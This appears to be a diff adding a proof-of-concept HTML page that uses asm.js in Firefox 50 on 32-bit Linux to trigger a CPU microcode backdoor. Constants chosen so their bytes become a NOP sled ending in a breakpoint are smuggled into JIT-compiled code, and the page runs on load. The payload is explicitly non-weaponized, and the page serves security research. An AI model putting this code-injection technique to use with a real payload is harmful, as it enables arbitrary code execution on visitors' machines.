@@ -1,0 +1,60 @@
+<!DOCTYPE HTML>
+<html>
+<script>
+/*
+Firefox 50.0 32-bit on Linux
+
+We use a non-weaponized payload. Instructions
+
+offset:          opcodes        assembly
+=======          =======        ========
+0x00000000:      05909090a8     add eax, 0xa8909090
+0x00000005:      05909090cc     add eax, 0xcc909090
+
+become a nop-sled with a breakpoint at athe end, if
+the first instruction is executed from its first
+byte on:
+
+offset:          opcodes        assembly
+=======          =======        ========
+0x00000001:      90             nop
+0x00000002:      90             nop
+0x00000003:      90             nop
+0x00000004:      a805           test al, 5
+0x00000006:      90             nop
+0x00000007:      90             nop
+0x00000008:      90             nop
+0x00000009:      cc             int3
+*/
+
+function generate_microcode_trigger(){
+    "use asm";
+    function exec_payload(dividend, divisor){
+        dividend = dividend|0;
+        divisor = divisor|0;
+        var val = 0;
+        /* DIV EBX */
+        val = ((dividend>>>0) / (divisor>>>0))>>>0;
+        /* ADD EAX, 0xA8909090 */
+        val = (val + 0xa8909090)|0;
+        /* ADD EAX, 0xCC909090 */
+        val = (val + 0xcc909090)|0;
+        return val|0;
+    }
+    return exec_payload;
+}
+
+function main(){
+    /* trigger condition: */
+    /* dividend */
+    EAX = 0xa1a2a3a4
+    /* divisor */
+    EBX = 0xb1b2b3b4
+
+    trigger_microcode_backdoor = generate_microcode_trigger();
+    trigger_microcode_backdoor(EAX, EBX);
+}
+</script>
+<body onload=main()>
+</body>
+</html>
